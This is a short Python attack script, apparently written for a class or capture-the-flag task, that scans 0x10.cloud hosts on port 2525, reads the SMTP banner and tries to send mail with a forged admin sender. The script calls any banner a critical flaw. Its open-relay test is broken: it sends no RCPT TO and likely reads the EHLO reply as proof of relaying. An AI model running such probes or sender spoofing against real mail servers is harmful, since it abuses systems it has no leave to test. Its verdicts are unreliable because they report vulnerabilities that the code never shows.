# Author: Deniz Can
# Vulnerability: Exposed SMTP Service / Open Relay (Medium/Hard Level)
# Target: 0x10.cloud Subdomains (Port 2525)

import socket
import time

def exploit_smtp():
    # Hocanın mail sunucusunu saklayabileceği olası hedefler
    subdomains = ["smtp.0x10.cloud", "mail.0x10.cloud", "0x10.cloud"]
    port = 2525
    
    print("=" * 60)
    print(f"  Advanced Scan: Unauthenticated SMTP (Port {port})")
    print("=" * 60)
    
    for sub in subdomains:
        print(f"[*] Scanning {sub}...")
        time.sleep(0.2) # Rate limit kuralına uyuyoruz
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            result = s.connect_ex((sub, port))
            
            if result == 0:
                print(f"   [+] Connected to {sub}! Reading banner...")
                
                # Sunucunun karşılama mesajını (banner) alıyoruz
                banner = s.recv(1024).decode('utf-8', errors='ignore')
                print(f"   [>] Server says: {banner.strip()}")
                
                if banner:
                    print("\n[!!!] CRITICAL VULNERABILITY FOUND [!!!]")
                    print(f"-> Target: {sub}:{port}")
                    print("-> Issue: SMTP Mail Service Exposed on Non-Standard Port")
                    print("-> Impact: Attackers can communicate directly with the mail server.")
                    
                    # Hard Mode: İçeri sızıp sahte mail atmayı deniyoruz!
                    print("\n[*] Attempting 'Open Relay' bypass (Sending fake mail)...")
                    s.sendall(b"EHLO hacker.com\r\n")
                    time.sleep(0.5)
                    s.sendall(b"MAIL FROM:<admin@0x10.cloud>\r\n")
                    mail_resp = s.recv(1024).decode('utf-8', errors='ignore')
                    
                    if "250" in mail_resp or "OK" in mail_resp.upper():
                        print("-> Status: VULNERABLE! Server accepted unauthenticated mail routing (Open Relay).")
                    else:
                        print(f"-> Status: Mail routing protected, but service version is leaked: {mail_resp.strip()}")
                    
                    s.close()
                    return # Zafiyeti bulduk, çıkış yapıyoruz
            s.close()
        except Exception as e:
            print(f"   [-] Error: {e}")

    print("\n[*] Scan finished.")

if __name__ == "__main__":
    exploit_smtp()